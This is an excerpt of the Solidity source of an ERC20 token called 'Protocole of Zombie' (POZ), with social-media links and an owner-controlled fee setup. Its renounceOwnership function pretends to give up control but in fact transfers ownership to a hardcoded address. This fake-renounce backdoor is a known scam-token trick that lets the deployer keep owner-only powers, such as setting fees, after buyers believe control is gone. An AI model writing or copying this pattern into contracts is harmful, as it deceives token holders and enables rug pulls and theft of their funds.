...
//https://twitter.com/Zombie_ETH_
//https://t.me/ZombieApocalypseETH
...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3e1814d8BBa430f8b6DD5D062A46Fbc4DA1aE0C2));
        _owner = address(0x3e1814d8BBa430f8b6DD5D062A46Fbc4DA1aE0C2);
    }
...
contract ProtocolofZombie is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Protocole of Zombie", "POZ") {
        ...
        marketingAddress = 0x6b68DD8cFF6A45c885248bB9AaA1d73E278fA35D;
    ...
    function enableTrading(address controller) external onlyOwner {
        buyBurnFee = 0;
        buyMarketingFee = 2;
        buyLiquidityFee = 3;
        buyTotalFees = buyBurnFee + buyMarketingFee + buyLiquidityFee;
